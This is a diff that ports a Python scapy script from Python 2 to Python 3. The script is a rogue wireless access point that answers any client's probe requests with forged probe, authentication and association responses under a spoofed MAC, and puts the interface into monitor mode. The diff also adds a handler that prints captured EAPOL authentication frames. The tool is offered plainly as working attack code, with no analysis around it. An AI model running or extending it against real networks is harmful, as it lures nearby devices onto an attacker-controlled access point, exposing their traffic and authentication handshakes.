@@ -1,4 +1,4 @@
-#!/usr/bin/python
+#!/usr/bin/python3
 
 import os
 import sys
@@ -6,7 +6,8 @@ import time
 import getopt
 from scapy.all import *
 
-iface = "wlan0"
+iface = "wlp2s0"
+iwconfig_cmd = "/usr/sbin/iwconfig"
 ssid_filter = []
 client_addr = None
 mymac = "aa:bb:cc:aa:bb:cc"
@@ -24,7 +25,7 @@ def get_rates(packet):
             rates = packet.info
 
         elif packet.ID == 50:
-	    esrates = packet.info
+            esrates = packet.info
 
         packet = packet.payload
 
@@ -32,15 +33,15 @@ def get_rates(packet):
 
 
 def send_probe_response(packet):
-    ssid = packet.info
+    ssid = packet.info.decode()
     rates = get_rates(packet)
     channel = "\x07"
 
     if ssid_filter and ssid not in ssid_filter:
-	return
+        return
 
-    print "\n\nSending probe response for " + ssid + \
-          " to " + str(packet[Dot11].addr2) + "\n"
+    print("\n\nSending probe response for " + ssid + \
+          " to " + str(packet[Dot11].addr2) + "\n")
 
     # addr1 = destination, addr2 = source,
     # addr3 = access point
@@ -50,7 +51,7 @@ def send_probe_response(packet):
     resp = RadioTap() / \
            Dot11(addr1=packet[Dot11].addr2,
                  addr2=mymac, addr3=mymac) / \
-           Dot11ProbeResp(timestamp=time.time(),
+           Dot11ProbeResp(timestamp=int(time.time()),
                           cap=cap) / \
            Dot11Elt(ID='SSID', info=ssid) / \
            Dot11Elt(ID="Rates", info=rates[0]) / \
@@ -63,7 +64,7 @@ def send_probe_response(packet):
 def send_auth_response(packet):
     # Dont answer our own auth packets
     if packet[Dot11].addr2 != mymac:
-       print "Sending authentication to " + packet[Dot11].addr2
+       print("Sending authentication to " + packet[Dot11].addr2)
 
        res = RadioTap() / \
              Dot11(addr1=packet[Dot11].addr2,
@@ -75,12 +76,12 @@ def send_auth_response(packet):
 
 def send_association_response(packet):
     if ssid_filter and ssid not in ssid_filter:
-	return
+        return
 
     ssid = packet.info
     rates = get_rates(packet)
-    print "Sending Association response for " + ssid + \
-          " to " + packet[Dot11].addr2
+    print("Sending Association response for " + ssid + \
+          " to " + packet[Dot11].addr2)
 
     res = RadioTap() / \
           Dot11(addr1=packet[Dot11].addr2,
@@ -108,19 +109,23 @@ def handle_packet(packet):
     elif packet.haslayer(Dot11Auth):
         send_auth_response(packet)
 
+    # EAPOL authentication request
+    elif packet.haslayer(EAPOL): # and packet.type == 2:
+        print(packet)
+        
     # Got association request
     elif packet.haslayer(Dot11AssoReq):
         send_association_response(packet)
 
 
 def usage():
-    print sys.argv[0]
-    print """
+    print(sys.argv[0])
+    print("""
     -a <addr> (optional)
     -i <interface> (optional)
     -m <source_mac> (optional)
     -s <ssid1,ssid2> (optional)
-    """
+    """)
     sys.exit(1)
 
 
@@ -140,14 +145,14 @@ for opt in opts:
     elif opt[0] == "-i":
         iface = opt[1]
     elif opt[0] == "-m":
-	my_mac = opt[1]
+        my_mac = opt[1]
     elif opt[0] == "-s":
         ssid_filter = opt[1].split(",")
     else:
         usage()
 
-os.system("iwconfig " + iface + " mode monitor")
+os.system(iwconfig_cmd + " " + iface + " mode monitor")
 
 # Start sniffing
-print "Sniffing on interface " + iface
+print("Sniffing on interface " + iface)
 sniff(iface=iface, prn=handle_packet)
